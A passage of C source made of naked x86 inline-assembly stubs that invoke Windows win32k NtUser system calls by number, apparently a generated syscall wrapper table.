        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAsyncKeyState()
{
    __asm {
        mov eax, 0000117Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAtomName()
{
    __asm {
        mov eax, 0000117Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCaretBlinkTime()
{
    __asm {
        mov eax, 00001180h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCaretPos()
{
    __asm {
        mov eax, 00001181h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClassInfo()
{
    __asm {
        mov eax, 00001182h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClassName()
{
    __asm {
        mov eax, 00001183h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardData()
{
    __asm {
        mov eax, 00001184h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardFormatName()
{
    __asm {
        mov eax, 00001185h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardOwner()
{
    __asm {
        mov eax, 00001186h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardSequenceNumber()
{
    __asm {
        mov eax, 00001187h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipboardViewer()
{
    __asm {
        mov eax, 00001188h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetClipCursor()
{
    __asm {
        mov eax, 00001189h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetComboBoxInfo()
{
    __asm {
        mov eax, 0000118Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetControlBrush()
{
    __asm {
        mov eax, 0000118Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetControlColor()
{
    __asm {
        mov eax, 0000118Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCPD()
{
    __asm {
        mov eax, 0000118Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCursorFrameInfo()
{
    __asm {
        mov eax, 0000118Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetCursorInfo()
{
    __asm {
        mov eax, 0000118Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetDC()
{
    __asm {
        mov eax, 00001190h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetDCEx()
{
    __asm {
        mov eax, 00001191h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetDoubleClickTime()
{
    __asm {
        mov eax, 00001192h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetForegroundWindow()
{
    __asm {
        mov eax, 00001193h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetGuiResources()
{
    __asm {
        mov eax, 00001194h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetGUIThreadInfo()
{
    __asm {
        mov eax, 00001195h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetIconInfo()
{
    __asm {
        mov eax, 00001196h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetIconSize()
{
    __asm {
        mov eax, 00001197h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetImeHotKey()
{
    __asm {
        mov eax, 00001198h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetImeInfoEx()
{
    __asm {
        mov eax, 00001199h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetInternalWindowPos()
{
    __asm {
        mov eax, 0000119Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyboardLayoutList()
{
    __asm {
        mov eax, 0000119Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyboardLayoutName()
{
    __asm {
        mov eax, 0000119Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyboardState()
{
    __asm {
        mov eax, 0000119Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyNameText()
{
    __asm {
        mov eax, 0000119Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetKeyState()
{
    __asm {
        mov eax, 0000119Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetListBoxInfo()
{
    __asm {
        mov eax, 000011A0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMenuBarInfo()
{
    __asm {
        mov eax, 000011A1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMenuIndex()
{
    __asm {
        mov eax, 000011A2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMenuItemRect()
{
    __asm {
        mov eax, 000011A3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMessage()
{
    __asm {
        mov eax, 000011A4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMouseMovePointsEx()
{
    __asm {
        mov eax, 000011A5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetObjectInformation()
{
    __asm {
        mov eax, 000011A6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetOpenClipboardWindow()
{
    __asm {
        mov eax, 000011A7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetPriorityClipboardFormat()
{
    __asm {
        mov eax, 000011A8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetProcessWindowStation()
{
    __asm {
        mov eax, 000011A9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputBuffer()
{
    __asm {
        mov eax, 000011AAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputData()
{
    __asm {
        mov eax, 000011ABh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputDeviceInfo()
{
    __asm {
        mov eax, 000011ACh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRawInputDeviceList()
{
    __asm {
        mov eax, 000011ADh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetRegisteredRawInputDevices()
{
    __asm {
        mov eax, 000011AEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetScrollBarInfo()
{
    __asm {
        mov eax, 000011AFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetSystemMenu()
{
    __asm {
        mov eax, 000011B0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetThreadDesktop()
{
    __asm {
        mov eax, 000011B1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetThreadState()
{
    __asm {
        mov eax, 000011B2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetTitleBarInfo()
{
    __asm {
        mov eax, 000011B3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetUpdateRect()
{
    __asm {
        mov eax, 000011B4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetUpdateRgn()
{
    __asm {
        mov eax, 000011B5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserGetWindowDC()
{
    __asm {
        mov eax, 000011B6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetWindowPlacement()
{
    __asm {
        mov eax, 000011B7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetWOWClass()
{
    __asm {
        mov eax, 000011B8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserHardErrorControl()
{
    __asm {
        mov eax, 000011B9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserHideCaret()
{
    __asm {
        mov eax, 000011BAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserHiliteMenuItem()
{
    __asm {
        mov eax, 000011BBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserImpersonateDdeClientWindow()
{
    __asm {
        mov eax, 000011BCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserInitialize()
{
    __asm {
        mov eax, 000011BDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserInitializeClientPfnArrays()
{
    __asm {
        mov eax, 000011BEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserInitTask()
{
    __asm {
        mov eax, 000011BFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000030h
    }
}

__declspec(naked) ULONG NTAPI NtUserInternalGetWindowText()
{
    __asm {
        mov eax, 000011C0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserInvalidateRect()
{
    __asm {
        mov eax, 000011C1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserInvalidateRgn()
{
    __asm {
        mov eax, 000011C2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserIsClipboardFormatAvailable()
{
    __asm {
        mov eax, 000011C3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserKillTimer()
{
    __asm {
        mov eax, 000011C4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserLoadKeyboardLayoutEx()
{
    __asm {
        mov eax, 000011C5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserLockWindowStation()
{
    __asm {
        mov eax, 000011C6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserLockWindowUpdate()
{
    __asm {
        mov eax, 000011C7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserLockWorkStation()
{
    __asm {
        mov eax, 000011C8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserMapVirtualKeyEx()
{
    __asm {
        mov eax, 000011C9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserMenuItemFromPoint()
{
    __asm {
        mov eax, 000011CAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserMessageCall()
{
    __asm {
        mov eax, 000011CBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserMinMaximize()
{
    __asm {
        mov eax, 000011CCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserMNDragLeave()
{
    __asm {
        mov eax, 000011CDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserMNDragOver()
{
    __asm {
        mov eax, 000011CEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserModifyUserStartupInfoFlags()
{
    __asm {
        mov eax, 000011CFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserMoveWindow()
{
    __asm {
        mov eax, 000011D0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserNotifyIMEStatus()
{
    __asm {
        mov eax, 000011D1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserNotifyProcessCreate()
{
    __asm {
        mov eax, 000011D2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserNotifyWinEvent()
{
    __asm {
        mov eax, 000011D3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenClipboard()
{
    __asm {
        mov eax, 000011D4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenDesktop()
{
    __asm {
        mov eax, 000011D5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenInputDesktop()
{
    __asm {
        mov eax, 000011D6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserOpenWindowStation()
{
    __asm {
        mov eax, 000011D7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserPaintDesktop()
{
    __asm {
        mov eax, 000011D8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserPeekMessage()
{
    __asm {
        mov eax, 000011D9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserPostMessage()
{
    __asm {
        mov eax, 000011DAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserPostThreadMessage()
{
    __asm {
        mov eax, 000011DBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserPrintWindow()
{
    __asm {
        mov eax, 000011DCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserProcessConnect()
{
    __asm {
        mov eax, 000011DDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserQueryInformationThread()
{
    __asm {
        mov eax, 000011DEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserQueryInputContext()
{
    __asm {
        mov eax, 000011DFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserQuerySendMessage()
{
    __asm {
        mov eax, 000011E0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserQueryWindow()
{
    __asm {
        mov eax, 000011E1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserRealChildWindowFromPoint()
{
    __asm {
        mov eax, 000011E2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRealInternalGetMessage()
{
    __asm {
        mov eax, 000011E3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserRealWaitMessageEx()
{
    __asm {
        mov eax, 000011E4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserRedrawWindow()
{
    __asm {
        mov eax, 000011E5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterClassExWOW()
{
    __asm {
        mov eax, 000011E6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterUserApiHook()
{
    __asm {
        mov eax, 000011E7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterHotKey()
{
    __asm {
        mov eax, 000011E8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterRawInputDevices()
{
    __asm {
        mov eax, 000011E9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterTasklist()
{
    __asm {
        mov eax, 000011EAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterWindowMessage()
{
    __asm {
        mov eax, 000011EBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoveMenu()
{
    __asm {
        mov eax, 000011ECh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoveProp()
{
    __asm {
        mov eax, 000011EDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserResolveDesktop()
{
    __asm {
        mov eax, 000011EEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserResolveDesktopForWOW()
{
    __asm {
        mov eax, 000011EFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSBGetParms()
{
    __asm {
        mov eax, 000011F0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserScrollDC()
{
    __asm {
        mov eax, 000011F1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserScrollWindowEx()
{
    __asm {
        mov eax, 000011F2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserSelectPalette()
{
    __asm {
        mov eax, 000011F3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSendInput()
{
    __asm {
        mov eax, 000011F4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetActiveWindow()
{
    __asm {
        mov eax, 000011F5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetAppImeLevel()
{
    __asm {
        mov eax, 000011F6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCapture()
{
    __asm {
        mov eax, 000011F7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClassLong()
{
    __asm {
        mov eax, 000011F8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClassWord()
{
    __asm {
        mov eax, 000011F9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClipboardData()
{
    __asm {
        mov eax, 000011FAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClipboardViewer()
{
    __asm {
        mov eax, 000011FBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetConsoleReserveKeys()
{
    __asm {
        mov eax, 000011FCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCursor()
{
    __asm {
        mov eax, 000011FDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCursorContents()
{
    __asm {
        mov eax, 000011FEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCursorIconData()
{
    __asm {
        mov eax, 000011FFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetFocus()
{
    __asm {
        mov eax, 00001200h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetImeHotKey()
{
    __asm {
        mov eax, 00001201h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetImeInfoEx()
{
    __asm {
        mov eax, 00001202h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetImeOwnerWindow()
{
    __asm {
        mov eax, 00001203h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetInformationProcess()
{
    __asm {
        mov eax, 00001204h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetInformationThread()
{
    __asm {
        mov eax, 00001205h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetInternalWindowPos()
{
    __asm {
        mov eax, 00001206h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetKeyboardState()
{
    __asm {
        mov eax, 00001207h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetLogonNotifyWindow()
{
    __asm {
        mov eax, 00001208h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenu()
{
    __asm {
        mov eax, 00001209h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenuContextHelpId()
{
    __asm {
        mov eax, 0000120Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenuDefaultItem()
{
    __asm {
        mov eax, 0000120Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenuFlagRtoL()
{
    __asm {
        mov eax, 0000120Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetObjectInformation()
{
    __asm {
        mov eax, 0000120Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetParent()
{
    __asm {
        mov eax, 0000120Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetProcessWindowStation()
{
    __asm {
        mov eax, 0000120Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetProp()
{
    __asm {
        mov eax, 00001210h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

